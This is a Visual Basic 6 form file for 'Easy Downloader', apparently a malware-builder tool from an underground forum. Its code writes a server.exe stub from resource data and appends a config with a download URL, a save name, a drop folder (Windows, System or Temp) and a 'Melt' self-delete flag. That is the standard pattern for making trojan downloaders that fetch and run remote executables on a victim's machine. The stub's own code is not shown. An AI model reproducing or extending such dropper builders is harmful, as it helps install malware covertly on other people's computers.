VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Easy Downloader"
   ClientHeight    =   2055
   ClientLeft      =   5355
   ClientTop       =   3915
   ClientWidth     =   4245
   ControlBox      =   0   'False
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2055
   ScaleWidth      =   4245
   Begin VB.CheckBox chkMelt 
      Caption         =   "Melt"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   240
      TabIndex        =   9
      Top             =   1320
      Width           =   855
   End
   Begin VB.ComboBox Combo1 
      Height          =   315
      Left            =   120
      TabIndex        =   7
      Text            =   "Temp"
      Top             =   840
      Width           =   1575
   End
   Begin VB.CommandButton Command3 
      Caption         =   "About"
      Height          =   255
      Left            =   1680
      TabIndex        =   6
      Top             =   1680
      Width           =   855
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Exit"
      Height          =   255
      Left            =   2760
      TabIndex        =   5
      Top             =   1680
      Width           =   855
   End
   Begin VB.TextBox txtSave 
      Height          =   285
      Left            =   2040
      TabIndex        =   2
      Text            =   "example.exe"
      Top             =   840
      Width           =   1935
   End
   Begin VB.TextBox txtURL 
      Height          =   285
      Left            =   0
      TabIndex        =   1
      Text            =   "http://example.com/example.exe"
      Top             =   240
      Width           =   4215
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Build"
      Height          =   255
      Left            =   600
      TabIndex        =   0
      Top             =   1680
      Width           =   855
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      Caption         =   "Save Name:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   2040
      TabIndex        =   8
      Top             =   600
      Width           =   1050
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      Caption         =   "URL:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   0
      TabIndex        =   4
      Top             =   0
      Width           =   450
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      Caption         =   "Save Path:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   120
      TabIndex        =   3
      Top             =   600
      Width           =   960
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Simple example of downloader by steve10120
'thx to whitegabber for builder example :D
'Please don't be a ripper and give at least a little credit to the author
' just like I have done ^^.

'Visit: http://sys-overload.com

Const DATA_ARRAY = "[split]"
Const DATA_START = "[start]"
Dim Var As String


Public Sub Combo1_Click()

Select Case Combo1.Text
    Case "Custom":
        Var = "C:\"
    Case "Windows":
        Var = "win"
    Case "System":
        Var = "sys"
    Case "Temp":
        Var = "tmp"
    End Select

End Sub

Private Sub Command1_Click()
If Not Right(txtSave, 4) = ".exe" Then
MsgBox "Please make sure you the save name has a .exe extension.", vbExclamation, "Error"
Exit Sub
End If
Dim Buffer() As Byte
On Error Resume Next
Kill App.Path + "\server.exe"

Open App.Path + "\server.exe" For Binary As #1

Buffer() = LoadResData(101, "CUSTOM")

Put #1, , Buffer

Put #1, , DATA_START + txtURL.Text + DATA_ARRAY + txtSave.Text + DATA_ARRAY + Var + DATA_ARRAY

If chkMelt.Value = 1 Then

Put #1, , "Melt" + DATA_ARRAY

End If

Close #1

End Sub

Private Sub Command2_Click()
End
End Sub

Private Sub Command3_Click()
MsgBox "Easy Downloader" & vbNewLine & vbNewLine & _
"by steve10120" & vbNewLine & vbNewLine & "http://sys-overload.com"
End Sub

Private Sub Form_Load()

Var = "tmp"

With Combo1

    .AddItem ("Windows")
    .AddItem ("Temp")
    .AddItem ("System")
    .AddItem ("Custom")
    
End With

End Sub


